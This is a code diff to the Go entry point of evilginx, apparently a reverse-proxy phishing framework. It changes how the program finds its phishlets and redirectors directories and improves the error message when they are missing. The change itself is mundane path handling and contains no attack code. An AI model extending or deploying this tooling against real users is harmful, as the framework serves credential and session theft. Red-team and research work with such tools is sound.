@@ -50,23 +50,43 @@ func main() {
 	certmagic.DefaultACME.Logger = zap.NewNop()
 
 	if *phishlets_dir == "" {
-		*phishlets_dir = joinPath(exe_dir, "./phishlets")
+		// Try 1: Relative to executable
+		*phishlets_dir = joinPath(exe_dir, "phishlets")
 		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-			*phishlets_dir = "/usr/share/evilginx/phishlets/"
+			// Try 2: Parent directory (handles build/evilginx case)
+			*phishlets_dir = joinPath(exe_dir, "../phishlets")
 			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
-				return
+				// Try 3: System installation path
+				*phishlets_dir = "/usr/share/evilginx/phishlets/"
+				if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
+					log.Fatal("phishlets directory not found. Tried:\n  - %s\n  - %s\n  - %s\nPlease specify with -p flag",
+						joinPath(exe_dir, "phishlets"),
+						joinPath(exe_dir, "../phishlets"),
+						"/usr/share/evilginx/phishlets/")
+					return
+				}
 			}
 		}
+		// Clean the path to resolve .. references
+		*phishlets_dir = filepath.Clean(*phishlets_dir)
 	}
 	if *redirectors_dir == "" {
-		*redirectors_dir = joinPath(exe_dir, "./redirectors")
+		// Try 1: Relative to executable
+		*redirectors_dir = joinPath(exe_dir, "redirectors")
 		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
-			*redirectors_dir = "/usr/share/evilginx/redirectors/"
+			// Try 2: Parent directory (handles build/evilginx case)
+			*redirectors_dir = joinPath(exe_dir, "../redirectors")
 			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
-				*redirectors_dir = joinPath(exe_dir, "./redirectors")
+				// Try 3: System installation path
+				*redirectors_dir = "/usr/share/evilginx/redirectors/"
+				if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+					// Fallback: Create in parent directory
+					*redirectors_dir = joinPath(exe_dir, "../redirectors")
+				}
 			}
 		}
+		// Clean the path to resolve .. references
+		*redirectors_dir = filepath.Clean(*redirectors_dir)
 	}
 	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
 		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
